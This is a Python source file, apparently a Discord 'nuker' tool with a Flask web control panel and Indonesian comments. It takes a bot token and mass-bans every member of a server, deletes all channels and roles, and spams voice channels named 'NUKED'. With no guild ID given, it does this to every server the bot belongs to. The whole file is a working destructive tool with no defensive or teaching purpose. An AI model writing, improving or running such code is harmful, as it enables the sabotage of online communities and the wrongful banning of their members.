import asyncio
import discord
from discord.ext import commands
from flask import Flask, render_template, request, jsonify, session
from colorama import init, Fore
import threading
import time
import sys
from functools import wraps

init()
app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Ganti dengan secret key yang aman

# Global state untuk nuke operations
nuke_status = {
    'running': False,
    'current_action': '',
    'progress': 0,
    'logs': [],
    'current_guild': '',
    'completed': False,
    'error': None
}

def run_async(func):
    """Decorator untuk menjalankan fungsi async di thread terpisah"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=asyncio.run, args=(func(*args, **kwargs),))
        thread.daemon = True
        thread.start()
        return thread
    return wrapper

def add_log(message, color='info'):
    """Menambahkan log ke status"""
    timestamp = time.strftime("%H:%M:%S")
    nuke_status['logs'].append({
        'time': timestamp,
        'message': message,
        'color': color
    })
    # Keep only last 100 logs
    if len(nuke_status['logs']) > 100:
        nuke_status['logs'] = nuke_status['logs'][-100:]

async def delete_all_channel(guild):
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
            add_log(f"Deleted channel: {channel.name}")
        except Exception as e:
            add_log(f"Failed to delete channel {channel.name}: {str(e)}", 'error')
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            if role.name != "@everyone":
                await role.delete()
                deleted += 1
                add_log(f"Deleted role: {role.name}")
        except Exception as e:
            add_log(f"Failed to delete role {role.name}: {str(e)}", 'error')
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        try:
            if member != guild.me:
                await member.ban()
                banned += 1
                add_log(f"Banned member: {member.name}")
        except Exception as e:
            add_log(f"Failed to ban {member.name}: {str(e)}", 'error')
    return banned

async def create_voice_channels(guild, name):
    created = 0
    for _ in range(min(200 - len(guild.channels), 50)):  # Batasi maks 50
        try:
            await guild.create_voice_channel(name=name)
            created += 1
            add_log(f"Created voice channel: {name}")
        except Exception as e:
            add_log(f"Failed to create voice channel: {str(e)}", 'error')
    return created

async def nuke_guild(guild, channel_name):
    global nuke_status
    
    nuke_status['current_guild'] = guild.name
    add_log(f"Starting nuke on: {guild.name}")
    
    # Ban members
    nuke_status['current_action'] = 'Banning members...'
    banned = await ban_all_members(guild)
    add_log(f"Banned {banned} members", 'success')
    
    # Delete channels
    nuke_status['current_action'] = 'Deleting channels...'
    deleted_channels = await delete_all_channel(guild)
    add_log(f"Deleted {deleted_channels} channels", 'success')
    
    # Delete roles
    nuke_status['current_action'] = 'Deleting roles...'
    deleted_roles = await delete_all_roles(guild)
    add_log(f"Deleted {deleted_roles} roles", 'success')
    
    # Create voice channels
    nuke_status['current_action'] = 'Creating voice channels...'
    created_channels = await create_voice_channels(guild, channel_name)
    add_log(f"Created {created_channels} voice channels", 'success')
    
    add_log(f"Nuke completed on {guild.name}", 'success')
    return {
        'banned': banned,
        'channels_deleted': deleted_channels,
        'roles_deleted': deleted_roles,
        'channels_created': created_channels
    }

@run_async
async def start_nuke(token, guild_id=None, channel_name="nuked"):
    global nuke_status
    
    nuke_status.update({
        'running': True,
        'completed': False,
        'error': None,
        'logs': [],
        'progress': 0
    })
    
    try:
        intents = discord.Intents.all()
        client = commands.Bot(command_prefix='.', intents=intents)
        
        @client.event
        async def on_ready():
            add_log(f"Bot connected as {client.user.name}", 'success')
            add_log(f"Bot in {len(client.guilds)} servers", 'info')
            
            try:
                if guild_id:
                    # Nuke specific guild
                    guild = client.get_guild(int(guild_id))
                    if guild:
                        result = await nuke_guild(guild, channel_name)
                        add_log(f"Nuke completed! Stats: {result}", 'success')
                    else:
                        add_log(f"Guild with ID {guild_id} not found", 'error')
                else:
                    # Nuke all guilds
                    total = len(client.guilds)
                    for i, guild in enumerate(client.guilds):
                        nuke_status['progress'] = int((i / total) * 100)
                        result = await nuke_guild(guild, channel_name)
                        add_log(f"Completed nuke on {guild.name}: {result}", 'success')
                
                nuke_status['completed'] = True
                add_log("All nuke operations completed", 'success')
                
            except Exception as e:
                add_log(f"Error during nuke: {str(e)}", 'error')
                nuke_status['error'] = str(e)
            finally:
                await client.close()
                nuke_status['running'] = False
        
        add_log("Starting bot...")
        await client.start(token)
        
    except discord.errors.LoginFailure:
        add_log("Invalid bot token", 'error')
        nuke_status['error'] = "Invalid bot token"
        nuke_status['running'] = False
    except Exception as e:
        add_log(f"Unexpected error: {str(e)}", 'error')
        nuke_status['error'] = str(e)
        nuke_status['running'] = False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def get_status():
    return jsonify(nuke_status)

@app.route('/api/start', methods=['POST'])
def start_nuke_api():
    if nuke_status['running']:
        return jsonify({'error': 'Nuke is already running'}), 400
    
    data = request.json
    token = data.get('token', '').strip()
    guild_id = data.get('guild_id', '').strip()
    channel_name = data.get('channel_name', 'NUKED').strip()
    
    if not token:
        return jsonify({'error': 'Token is required'}), 400
    
    # Reset status
    global nuke_status
    nuke_status = {
        'running': True,
        'current_action': 'Initializing...',
        'progress': 0,
        'logs': [],
        'current_guild': '',
        'completed': False,
        'error': None
    }
    
    # Start nuke in background
    start_nuke(token, guild_id if guild_id else None, channel_name)
    
    return jsonify({'message': 'Nuke started'})

@app.route('/api/stop', methods=['POST'])
def stop_nuke():
    # Note: Discord.py doesn't have an easy way to stop from outside
    # This just sets the status
    nuke_status['running'] = False
    nuke_status['current_action'] = 'Stopping...'
    return jsonify({'message': 'Stop command sent'})

@app.route('/api/clear', methods=['POST'])
def clear_logs():
    nuke_status['logs'] = []
    return jsonify({'message': 'Logs cleared'})

if __name__ == '__main__':
    app.run(debug=True, port=5000)